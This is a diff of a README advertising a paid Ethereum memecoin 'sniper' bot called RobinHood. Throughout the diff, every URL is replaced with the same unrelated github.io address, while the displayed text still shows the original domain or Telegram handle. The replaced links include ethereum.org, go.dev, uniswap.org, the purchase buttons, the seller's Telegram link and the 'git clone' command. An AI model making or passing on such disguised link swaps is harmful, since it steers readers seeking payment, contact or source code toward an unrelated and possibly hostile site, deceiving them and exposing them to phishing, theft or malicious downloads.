@@ -4,14 +4,14 @@
 
 **AI-powered dev sniper for Ethereum & EVM chains — Twitter-driven auto-deploys, top-dev mirroring, and sub-block Uniswap sniping with Flashbots bundle protection. Written in Go.**
 
-[![Ethereum](https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=ethereum&logoColor=white)](https://ethereum.org)
-[![Go](https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
+[![Ethereum](https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
+[![Go](https://img.shields.io/badge/Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://rosariocounterintuitive101.github.io)
 [![License](https://img.shields.io/badge/License-Commercial-red?style=for-the-badge)]()
 
-[![Core](https://img.shields.io/badge/Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
-[![Full Suite](https://img.shields.io/badge/Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
+[![Core](https://img.shields.io/badge/Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
+[![Full Suite](https://img.shields.io/badge/Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
 
-[Get Access](https://memesnipe.fun) · [Pricing](#pricing) · [Features](#features) · [Demo](#demo) · [Architecture](#architecture)
+[Get Access](https://rosariocounterintuitive101.github.io) · [Pricing](#pricing) · [Features](#features) · [Demo](#demo) · [Architecture](#architecture)
 
 </div>
 
@@ -19,7 +19,7 @@
 
 ## What is RobinHood?
 
-A high-performance Go trading bot built for [Uniswap](https://uniswap.org) and EVM chains. Let the AI deving autopilot deploy from your presets the moment a narrative breaks, mirror your favorite top devs automatically, react to real-time Twitter signals, and snipe fresh liquidity across multiple wallets with Flashbots bundle protection — all through a clean REST API.
+A high-performance Go trading bot built for [Uniswap](https://rosariocounterintuitive101.github.io) and EVM chains. Let the AI deving autopilot deploy from your presets the moment a narrative breaks, mirror your favorite top devs automatically, react to real-time Twitter signals, and snipe fresh liquidity across multiple wallets with Flashbots bundle protection — all through a clean REST API.
 
 Built for traders who need same-block execution on new token launches, shipped as the **full source code** with a lifetime license.
 
@@ -47,9 +47,9 @@ Two one-time licenses. Pay once in **ETH**, own the source forever — no subscr
 
 <div align="center">
 
-[![Buy Core — 1 ETH](https://img.shields.io/badge/Buy_Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
+[![Buy Core — 1 ETH](https://img.shields.io/badge/Buy_Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
 &nbsp;
-[![Buy Full Suite — 1.5 ETH](https://img.shields.io/badge/Buy_Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
+[![Buy Full Suite — 1.5 ETH](https://img.shields.io/badge/Buy_Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
 
 **Pay with 300+ cryptocurrencies · Instant delivery · 24/7 support on Telegram**
 
@@ -227,8 +227,8 @@ type wsHub struct {
 RobinHood ships as the **full source code** with a lifetime license.
 
 ### Quick Start
-1. **Pick your tier** and pay at [memesnipe.fun](https://memesnipe.fun) — 1 ETH (Core) or 1.5 ETH (Full Suite)
-2. Message **[@nik0dev](https://t.me/nik0dev)** on Telegram with your order ID
+1. **Pick your tier** and pay at [memesnipe.fun](https://rosariocounterintuitive101.github.io) — 1 ETH (Core) or 1.5 ETH (Full Suite)
+2. Message **[@nik0dev](https://rosariocounterintuitive101.github.io)** on Telegram with your order ID
 3. Receive your private GitHub invite (or the source files directly)
 4. Self-host your instance, configure wallets and presets, and start sniping
 
@@ -237,7 +237,7 @@ RobinHood ships as the **full source code** with a lifetime license.
 ## Build from Source
 
 ```bash
-git clone https://github.com/0xNikoDev/robinhood-ai-dev-sniper.git
+git clone https://rosariocounterintuitive101.github.io
 cd robinhood-ai-dev-sniper
 cp .env.example .env   # set EVM_RPC_URL, EVM_WS_URL, LICENSE_KEYS
 go mod download
@@ -290,7 +290,7 @@ Yes. Both tiers include the complete source under a commercial lifetime license.
 Core (1 ETH) is the complete sniping engine — Flashbots bundles, auto take-profit, mempool monitoring, volume bot, and the Dexscreener overlay. Full Suite (1.5 ETH) adds Twitter parsing, top-dev tracking, the AI deving autopilot, the ERC-20 Token Creator, and priority support.
 
 **Can I upgrade later?**
-Yes — pay the 0.5 ETH difference and message [@nik0dev](https://t.me/nik0dev) with your order ID to unlock the Full Suite.
+Yes — pay the 0.5 ETH difference and message [@nik0dev](https://rosariocounterintuitive101.github.io) with your order ID to unlock the Full Suite.
 
 **What chains are supported?**
 Any EVM chain — Ethereum, Base, BNB Chain, Arbitrum — via configurable RPC. Optimized for Uniswap V2/V3 style routers.
@@ -306,9 +306,9 @@ Same-block inclusion via Flashbots bundles. Sub-block latency with direct RPC on
 
 ### Ready to snipe fresh EVM liquidity?
 
-[![Buy Core — 1 ETH](https://img.shields.io/badge/Buy_Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
+[![Buy Core — 1 ETH](https://img.shields.io/badge/Buy_Core-1_ETH-58C88D?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
 &nbsp;
-[![Buy Full Suite — 1.5 ETH](https://img.shields.io/badge/Buy_Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://memesnipe.fun)
+[![Buy Full Suite — 1.5 ETH](https://img.shields.io/badge/Buy_Full_Suite-1.5_ETH-627EEA?style=for-the-badge&logo=ethereum&logoColor=white)](https://rosariocounterintuitive101.github.io)
 
 **Pay with 300+ cryptocurrencies · Instant delivery · 24/7 support on Telegram**
 
